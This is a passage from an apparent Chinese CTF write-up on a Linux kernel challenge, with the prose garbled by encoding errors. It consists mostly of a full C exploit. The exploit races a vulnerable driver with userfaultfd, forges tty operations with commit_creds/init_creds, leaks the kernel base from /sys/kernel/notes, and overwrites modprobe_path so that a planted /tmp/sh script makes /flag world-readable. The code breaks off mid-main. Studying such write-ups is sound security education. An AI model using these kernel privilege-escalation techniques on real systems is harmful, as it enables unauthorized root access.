çš„æƒé™æå‡åˆ°æ™®é€šéƒ½å¯ä»¥è¯»å–ï¼Œé‚£æˆ‘ä»¬è¦å¦‚ä½•ä¿®æ”¹è¿™ä¸ªåœ°æ–¹çš„å€¼å‘¢ï¼Ÿæˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªå¾ˆå¥½ç”¨çš„ <code>gadget</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xffffffff810f69f1</span>: mov qword ptr [rdx + <span class="number">8</span>], rsi; ret;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬æ‰§è¡Œ <code>iotcl(tty_fd, var1, var2)</code> çš„æ—¶å€™ï¼Œ<code>rdx</code> å’Œ <code>rsi</code> æ˜¯å¯æ§çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡ã€Šç±»ä¼¼äºã€‹ <code>ioctl(tty_fd, &quot;/tmp/sh&quot;, modprobe_path - 8);</code> æ¥å®ç°å¯¹ <code>modprobe_path</code> çš„ä¿®æ”¹</p><img src="/2024/10/07/kno_puts/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç”±äº <code>ioctl</code> çš„ <code>rsi</code> ä¼ è¿›å»çš„æœ€ç»ˆåªæœ‰å››å­—èŠ‚ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦åˆ†æ®µä¼ ä¸¤æ¬¡</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff824493c0</span>;</span><br><span class="line"><span class="type">size_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn = <span class="number">0xffffffff810bd960</span>;</span><br><span class="line"><span class="type">size_t</span> init_creds = <span class="number">0xffffffff82c6b920</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ce710</span>;</span><br><span class="line"><span class="type">size_t</span> fake_ops_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> orignal[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">size_t</span> leak, kernel_base;</span><br><span class="line"><span class="type">size_t</span> gadget = <span class="number">0xffffffff817d1e76</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> add_rsp_188_pop_rbx_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00a74</span>;</span><br><span class="line"><span class="type">size_t</span> magic_gadget = <span class="number">0xffffffff810f69f1</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_write, sem_free;</span><br><span class="line"><span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line"></span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        uffd_buf[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">        uffd_buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        uffd_buf[<span class="number">2</span>] = kernel_base + <span class="number">0x13e8030</span> - <span class="number">0x60</span>;</span><br><span class="line">        uffd_buf[<span class="number">3</span>] = fake_ops_addr + <span class="number">0x40</span>;</span><br><span class="line">        uffd_buf[<span class="number">4</span>] = commit_creds;</span><br><span class="line">        uffd_buf[<span class="number">5</span>] = init_creds;</span><br><span class="line">        uffd_buf[<span class="number">7</span>] = magic_gadget;</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[0]&quot;</span>, uffd_buf[<span class="number">0</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[1]&quot;</span>, uffd_buf[<span class="number">1</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[2]&quot;</span>, uffd_buf[<span class="number">2</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[3]&quot;</span>, uffd_buf[<span class="number">3</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[4]&quot;</span>, uffd_buf[<span class="number">4</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[5]&quot;</span>, uffd_buf[<span class="number">5</span>]);</span><br><span class="line">        </span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_flag</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x50</span>];</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;# make fake file magic not found&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag&#x27;&gt;/tmp/sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27;&gt;/tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line"></span><br><span class="line">    info(<span class="string">&quot;get flag&quot;</span>);</span><br><span class="line">    <span class="type">int</span> flag_fd = open(<span class="string">&quot;/flag&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open flag failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(flag_fd, data, <span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] flag is: %s\n&quot;</span>, data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> note_fd = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    read(note_fd, data, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;/sys/kernel/notes&quot;</span>, data, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x84</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x19e1180</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span 